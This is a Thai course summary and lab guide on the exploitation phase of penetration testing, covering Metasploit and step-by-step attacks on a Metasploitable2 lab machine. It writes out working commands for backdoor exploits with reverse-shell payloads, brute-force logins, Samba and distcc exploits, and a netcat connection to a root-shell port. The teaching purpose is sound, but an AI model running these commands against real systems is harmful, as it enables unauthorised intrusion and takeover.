สรุปเนื้อหาและปฏิบัติการ Lecture 6: Exploitation

#ออกสอบถึงบทนี้

วิชา Penetration Testing and Protection (0406136051)

1. สรุปเนื้อหาสำคัญ (Theoretical Overview)

  • Exploitation Phase: ขั้นตอนการจำลองการโจมตีเพื่อใช้ประโยชน์จากช่องโหว่ความปลอดภัยที่ตรวจพบ (Bypass security flaw) มุ่งเน้นการยืนยันว่าช่องโหว่นั้นสามารถถูกเจาะได้จริง (Vulnerability Validation & PoC Execution) และประเมินระดับความเสียหายที่อาจเกิดขึ้น
  • Exploit คืออะไร: วิธีการเลี่ยงช่องโหว่หรือหลบหลีกการควบคุมความปลอดภัย (Circumvent security control) รูปแบบการโจมตีแตกต่างกันตามระบบปฏิบัติการ บริการ และกระบวนการของเป้าหมาย แต่เป้าหมายสุดท้ายคือการเข้าถึงระบบโดยไม่ได้รับอนุญาต ควบคุม หรือดึงข้อมูล
  • เป้าหมายหลักของการทำ Exploitation (Goals):
    • Validate Vulnerabilities: ยืนยันว่าช่องโหว่ที่พบสามารถถูกโจมตีได้จริง
    • Assess Impact: ประเมินความเสียหายที่อาจเกิดขึ้น
    • Gain Access: เข้าถึงระบบ ข้อมูล หรือเครือข่ายโดยไม่ได้รับอนุญาต
    • Elevate Privileges: ยกระดับสิทธิ์เป็นระดับสูงสุด (เช่น root หรือ SYSTEM)
    • Establish Persistence: ตั้งกลไกคงการเข้าถึงไว้ในระยะยาว
  • กิจกรรมหลัก (Key Activities): Proof of Concept (PoC), Exploit Development, Gaining Access, Lateral Movement และ Privilege Escalation

2. ขั้นตอนในเฟส Exploitation (Steps)

  • 1. Preparation and Planning: เลือกช่องโหว่ที่มีแนวโน้มถูกโจมตีได้ดีที่สุด (พิจารณาความรุนแรง ผลกระทบ และความสามารถในการโจมตี) แล้วเตรียมหรือปรับแต่ง Exploit
  • 2. Exploit Execution: ใช้เครื่องมือ สคริปต์ หรือเทคนิคด้วยมือโจมตีช่องโหว่ เพื่อให้ได้การเข้าถึงครั้งแรก (Initial Foothold) เช่น User Account, Shell Access หรือควบคุม Web Application
  • 3. Post-Exploitation: ยกระดับสิทธิ์ (Privilege Escalation), สำรวจระบบ (System Enumeration), ขโมยข้อมูล (Data Exfiltration) และติดตั้ง Persistence (Backdoor / สร้างบัญชีผู้ใช้ใหม่ / แก้ไขการตั้งค่าระบบ)
  • 4. Cleanup and Documentation: ลบ Artifacts ที่ใช้ระหว่างการโจมตีเพื่อเลี่ยงการตรวจจับ และบันทึกสิ่งที่ค้นพบสำหรับรายงาน

3. Metasploit Framework

  • คืออะไร: ทั้งระบบทดสอบเจาะระบบและแพลตฟอร์มพัฒนาเครื่องมือความปลอดภัย ประกอบด้วย Tools, Libraries, Modules และ User Interfaces ทำงานเป็น Module Launcher — ตั้งค่า Exploit Module แล้วยิงไปยังเป้าหมาย หากสำเร็จ Payload จะทำงานบนเครื่องเป้าหมายและให้ Shell เพื่อโต้ตอบ
  • Metasploit vs Vulnerability Scanner: Scanner เพียงตรวจสอบว่าระบบมีช่องโหว่หรือไม่ (Passive, เสี่ยงสร้างความเสียหายน้อย) ส่วน Metasploit เป็นเครื่องมือ Exploitation ที่ใช้เจาะเป้าหมายจริง
  • คุณสมบัติเด่น: Modular Architecture, ฐานข้อมูล Exploit จำนวนมากที่อัปเดตโดยชุมชน, Automated Exploitation, Payload Customization, Post-Exploitation Tools และ UI หลายรูปแบบ (msfconsole / Armitage)
  • สถาปัตยกรรม (เขียนด้วย Ruby):
    • Rex (Ruby Extension Library): จัดการ Network Protocols พื้นฐาน (TCP, UDP, SSL, HTTP, SMB), Socket, Text Formatting และ Data Structures
    • MSF Core: ฟังก์ชันพื้นฐานของเฟรมเวิร์ก — Event Management, Session Control, UI และ Module Management
    • MSF Base: ขยาย MSF Core ด้วย API แบบง่ายสำหรับ UI (msfconsole) และ Scripts

4. โมดูลสำคัญของ Metasploit (Modules)

โมดูล รายละเอียด
Exploits โค้ดหรือสคริปต์ที่ใช้โจมตีจุดอ่อนของโปรแกรมเป้าหมาย (เช่น Buffer Overflow, RCE) เพื่อส่ง Payload
Payloads โค้ดที่ถูกส่งไปทำงานบนเครื่องเหยื่อหลังเจาะสำเร็จ เช่น Reverse Shell, Bind Shell, Meterpreter
Encoders เข้ารหัส/Obfuscate Payload เพื่อหลบหลีกการตรวจจับของ Antivirus, Firewall, IDS/IPS และ EDR
Auxiliary โมดูลสำหรับสแกน, Fuzzing, หรือ Brute-Force ตรวจสอบข้อมูลโดยไม่ส่ง Payload
NOP คำสั่งภาษาแอสเซมบลีที่ "ไม่ทำอะไร" ใช้เติมพื้นที่ Shellcode ให้สอดคล้องกัน
Post-Exploitation เครื่องมือสำหรับทำงานหลังเจาะสำเร็จ เช่น Privilege Escalation และ Data Extraction
Evasion โมดูลสร้าง Payload ที่เลี่ยงการตรวจจับของ EDR / Antivirus

5. คำสั่งพื้นฐานของ Metasploit (Commands)

  • msfconsole — เริ่ม Metasploit ผ่าน Command Line
  • search <keyword> — ค้นหาโมดูล กรองได้ด้วย type:, cve:, platform:, rank: เช่น search type:exploit name:vsftpd หรือ search cve:2011-2523
  • use <module_path/number> — เลือกโมดูล เช่น use exploit/unix/ftp/vsftpd_234_backdoor   back — ยกเลิกโมดูลปัจจุบัน
  • info — แสดงรายละเอียดโมดูล (Options, References CVE/BID, ผู้พัฒนา)
  • show options — แสดงตัวเลือกที่ต้องตั้งค่า   show payloads — แสดง Payload ที่ใช้ได้กับ Exploit นี้
  • set <OPTION> <VALUE> — ตั้งค่าตัวเลือก เช่น set RHOSTS <Target_IP>, set PAYLOAD cmd/unix/reverse
  • exploit หรือ run — เริ่มการโจมตี   sessions -i 1 — เข้าโต้ตอบกับ Session ที่ได้

ตัวเลือกสำคัญของ Exploit Module

  • RHOST / RPORT: ที่อยู่เป้าหมายและพอร์ตที่โจมตี
  • LHOST / LPORT: IP ของ Kali และพอร์ตที่ใช้รับ Reverse Connection
  • Connection Type: Bind (ยิง Exploit แล้วเชื่อมต่อไปยังเป้าหมาย — เหมาะเมื่อเป้าหมายอยู่หลัง NAT/Firewall), Reverse (บังคับให้เป้าหมายเชื่อมกลับมาหาเรา), Auto (เลือกอัตโนมัติ)

6. ขั้นตอนการใช้งาน Metasploit กับเครื่องเป้าหมาย

  1. เปิด Terminal แล้วรัน msfconsole
  2. ใช้ search หา Exploit ที่ตรงกับช่องโหว่จากรายงานการสแกน (เช่น CVE)
  3. ใช้ use เลือก Exploit
  4. ใช้ show payloads ดู Payload ที่เลือกได้
  5. ใช้ set payload <path> เลือก Payload
  6. ใช้ show options ดูตัวเลือกที่ต้องกรอก
  7. ใช้ set กรอกค่าตัวเลือก (RHOSTS, LHOST, LPORT ฯลฯ)
  8. ใช้ exploit หรือ run ยิง Exploit ไปยังเป้าหมาย

7. รายละเอียดขั้นตอนปฏิบัติการ Lab (Step-by-Step Practical Guide)

ตอนที่ 1: การเจาะระบบผ่านบริการ FTP และ Backdoors

  • โจมตี vsftpd 2.3.4 Backdoor (Port 21): รันคำสั่งใน msfconsole โดยเลือกใช้ use exploit/unix/ftp/vsftpd_234_backdoor ตั้งค่า set RHOSTS <Target_IP> แล้วสั่ง exploit เพื่อรับสิทธิ์ root จากนั้นลองใช้คำสั่ง id, uname -a, whoami เพื่อยืนยันสิทธิ์
  • โจมตีผ่าน Python Exploit Script ด้วย Searchsploit: ค้นหา Exploit ด้วย searchsploit vsftpd 2.3.4 ดึงสคริปต์ด้วย searchsploit -m 49757 (option -m = mirror ไปยังไดเรกทอรีปัจจุบัน) แล้วรันคำสั่ง python2 49757.py <Target_IP>

ตอนที่ 2: การเจาะระบบผ่านบริการ Network Services อื่นๆ

  • SSH Login Brute-force (Port 22): ใช้โมดูล auxiliary/scanner/ssh/ssh_login โดยเตรียมไฟล์ username/password ด้วย nano meta.txt (ใส่ msfadmin/msfadmin ไว้ด้วย) ตั้งค่า set USERPASS_FILE /home/kali/meta.txt, set STOP_ON_SUCCESS true แล้วรัน และเข้าสู่ระบบด้วย sessions -i 1
  • Telnet (Port 23): สแกนหาบริการด้วย Nmap แล้วลองล็อกอิน telnet <Target_IP> -l msfadmin ระบุ password msfadmin จากนั้นลองคำสั่ง id, uname -a, whoami
  • SMTP Enumeration (Port 25): ใช้โมดูล auxiliary/scanner/smtp/smtp_enum ตั้งค่า RHOSTS และ THREADS เพื่อแจกแจงผู้ใช้ แล้วยืนยันด้วยคำสั่ง Netcat เช่น VRFY mail, VRFY sshd
  • UnrealIRCd Backdoor (Port 6667): ใช้โมดูล exploit/unix/irc/unreal_ircd_3281_backdoor กำหนด Payload เป็น set PAYLOAD cmd/unix/reverse พร้อมตั้งค่า LHOST (IP ของ Kali) และ LPORT (เช่น 4444) แล้วสั่ง exploit — เป้าหมายจะเชื่อมกลับมาที่ Kali
  • VNC Password (Port 5900): ใช้โมดูลค้นหาด้วย search vnc login ตั้งค่า RHOSTS แล้ว exploit เพื่อทดสอบรหัสผ่านเริ่มต้น
  • Samba Usermap Script (Port 139 / 445): ใช้โมดูล exploit/multi/samba/usermap_script ตั้งค่า set RHOSTS <Target_IP> แล้วสั่ง exploit ตรวจสอบช่องโหว่ Samba ก่อนด้วย sudo nmap -sV --script vulners -p 139,445 <Target_IP>
  • เชื่อมต่อ Ingreslock Root Shell โดยตรง (Port 1524): รันคำสั่ง nc -nv <Target_IP> 1524 เพื่อรับ Root Prompt ทันที
  • DISTCC Command Execution (Port 3632): ตรวจสอบว่าบริการ postgresql ทำงานอยู่ (service postgresql status / service postgresql start) แล้วใช้ Exploit เพื่อรับ Shell และลองคำสั่ง hostname, whoami, ifconfig
  • PostgreSQL (Port 5432): ใช้โมดูล auxiliary/scanner/postgres/postgres_login ตั้งค่า set RHOSTS <Target_IP>, set STOP_ON_SUCCESS true แล้วรัน
  • NFS (Port 2049): ตรวจสอบ RPC ด้วย rpcinfo -p <Target_IP> และดูไดเรกทอรีที่แชร์ด้วย showmount -e <Target_IP>

ตอนที่ 3: การใช้งาน smbclient จัดการไฟล์ข้ามระบบ

  • เชื่อมต่อไปยังไดเรกทอรีแชร์ /tmp: รันคำสั่ง smbclient //<Target_IP>/tmp (กด Enter เพื่อล็อกอินแบบ Anonymous)
  • สั่งสร้างและตรวจสอบไดเรกทอรี: พิมพ์คำสั่ง mkdir <student_name> และตรวจสอบด้วย ls

ตอนที่ 4: การใช้ Armitage (Metasploit GUI)

  • ติดตั้งและเตรียมระบบ: รันคำสั่ง sudo apt install armitage -y, sudo systemctl start postgresql และ sudo msfdb init
  • เริ่มใช้งาน: เปิด Armitage จากนั้นไปที่เมนู Hosts → Nmap Scan → Quick Scan (OS Detect) และใส่ IP Address ของเครื่อง Metasploitable2 ในช่อง Targets
  • จัดการและควบคุม Metasploit ผ่าน GUI: Armitage เป็นโปรแกรมส่วนต่อประสานกราฟิก (GUI) สำหรับจัดการและควบคุม Metasploit Framework ซึ่งช่วยให้มองเห็น Hosts, ใช้ Exploit และจัดการ Sessions ได้ง่ายขึ้น

8. สรุปรายการภาระงานที่ต้องส่ง (Assignment Checklist หน้า 96)

  • ภาพฝั่ง Kali Linux: ภาพหน้าจอ Terminal ที่ใช้คำสั่งสั่งสร้าง Directory ชื่อนักศึกษาในไดเรกทอรี /tmp (ผ่าน smbclient หรือช่องทาง Shell) พร้อมแสดงผลด้วยคำสั่ง ls
  • ภาพฝั่ง Metasploitable2: ภาพหน้าจอของเครื่อง Metasploitable2 เมื่อเข้าไปที่ /tmp แล้วรันคำสั่ง ls -l เพื่อยืนยันว่ามี Directory ชื่อนักศึกษาปรากฏอยู่จริง
